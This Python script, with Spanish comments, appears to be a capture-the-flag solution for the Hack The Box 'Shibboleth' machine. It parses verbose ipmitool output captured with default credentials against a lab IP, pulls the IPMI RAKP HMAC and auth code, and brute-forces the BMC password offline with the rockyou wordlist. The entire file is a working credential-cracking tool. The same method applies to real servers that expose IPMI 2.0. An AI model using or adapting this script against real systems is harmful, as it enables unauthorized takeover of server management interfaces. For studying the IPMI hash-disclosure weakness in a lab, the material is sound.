#!/usr/bin/python3

# Referencias:
## * HMAC
## -> https://linuxhint.com/hmac-module-python/
## -> https://python.readthedocs.io/en/v2.7.2/library/hmac.html

import base64
import codecs
import signal
import hmac
import re

# ┌ Clases
# └------------------------------------------------------
class Color:
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    END = '\033[0m'

# ┌ Funciones
# └------------------------------------------------------
def exit2calle(sig, frame):  # contralamos salida forzada con CTRL+C
    print("\nSaliendo con cariño...")
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def extract_hex_pw():  # extraemos el buffer del output de ipmitool
    array = []
    with open('output_ipmi.txt','r') as file_content:  # Acá esta el output de ejecutar:
        # ipmitool -I lanplus -v -v -v -U Administrator -P root -H 10.10.11.124 chassis identify
        for pos, line in enumerate(file_content):
            line = line.strip()

            # Extraemos posiciones y BMC
            if "Key exchange auth code" in line:  # Este es el BMC
                key_exchange = re.findall(r'<<  Key exchange auth code \[sha1\] : 0x(.*)', line)[0]
                key_exchange_bmc = "0x" + key_exchange
            elif ">> rakp2 mac input buffer" in line:  # Acá inicia el buffer donde esta la contraseña
                initial = pos+1
            elif ">> rakp2 mac key" in line:  # Para indicar hasta donde queremos extraer
                last = pos
                break

            # Generamos array para extraer la info que necesitamos únicamente
            array.append(line)

    # Obtenemos el buffer de la contraseña con los rangos extraidos anteriormente
    hex_buffer = ''.join(array[initial:last]).replace(" ","")

    # Hex a ASCII
    decode_hex = codecs.getdecoder("hex_codec")
    string_buffer = decode_hex(hex_buffer)[0]

    return string_buffer, key_exchange_bmc

def bruteforce(string_buffer, key_exchange_bmc):  # generamos HMAC con cada posible contraseña y comparamos con el BMC
    count = 500000
    with open('/usr/share/wordlists/rockyou.txt','r', encoding="latin-1") as file_content:
        for pos, line in enumerate(file_content):

            # "Contraseña" con la que probaremos
            key = line.strip()

            # Generamos HMAC con la key
            hmac_string = hmac.new(key=key.encode(), msg=string_buffer, digestmod="sha1")
            clear_text_pw = hmac_string.hexdigest()

            # Validamos HMAC con BMC de la respuesta para encontrar contraseña
            if "0x" + clear_text_pw == key_exchange_bmc:
                print("-----------------" + Color.RED + " PAREN TODOOOOOOOOOOOO " + Color.END + "------------------")
                print("[+] " + Color.WHITE + "Se ha encontrado una coincidencia!" + Color.END)
                print("[+] BMC: " + key_exchange_bmc)
                print("[+] HMAC Generado: " + Color.BLUE + "0x" + clear_text_pw + Color.END)
                print("[+] Posición dentro del archivo: " + str(pos))
                print("[+] Contraseña en texto plano: " + Color.YELLOW + key + Color.END)
                exit(0)

            if pos == count:
                print("[+] Progreso: Linea {} -> Contraseña {}".format(count, key))
                count = count + 500000

        print("[-] " + Color.RED + "No hay coincidencias, intenta con otra lista." + Color.END)

def main():
    banner = base64.b64decode("CuKVk+KUgOKUgOKVluKVkyAg4pWW4pSA4pWl4pSAIOKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVkyAgIOKVk+KUgOKUgCDilZPilIDilIDilZbilZMgIOKVlgrilZnilIDilIDilZbilZEgIOKVqyDilZEgIOKVkeKUgOKUgOKVnOKVkeKUgOKUgOKVnOKVkSAg4pWR4pWRICAg4pWRICAg4pWZIOKVkeKVnOKVkSAg4pWrCuKVpSAg4pWr4pWr4pSA4pSA4pWrIOKVkSAg4pWr4pSA4pSA4pWW4pWr4pSA4pSA4pWW4pWrICDilZHilasgICDilavilIDilIAgICDilZEg4pWr4pSA4pSA4pWrCuKVmeKUgOKUgOKVnOKVqCAg4pWo4pSA4pWo4pSA4pSA4pWo4pSA4pSA4pWc4pWo4pSA4pSA4pWc4pWZ4pSA4pSA4pWc4pWZ4pSA4pSA4pSA4pWZ4pSA4pSA4pSAIOKUgOKVqCDilaggIOKVqOKAoiBieSBsYW56CgpIVEItU2hpYmJvbGV0aCAtIFByb3RvY29sbyBSQUZQIGVuIElQTUksIHBlcm1pdGUgZ3JhYmFyIEhNQUMgSVBNSSBwYXNzd29yZCBoYXNoIChCcnV0ZS1Gb3JjZSkK").decode()
    print(banner)

    # Extraemos buffer con la password
    string_buffer, key_exchange_bmc = extract_hex_pw()
    # Generamos HMAC con el buffer y comparamos con BMC
    bruteforce(string_buffer, key_exchange_bmc)

# ┌ Inicio del programa
# └------------------------------------------------------
if __name__ == '__main__':
    main()
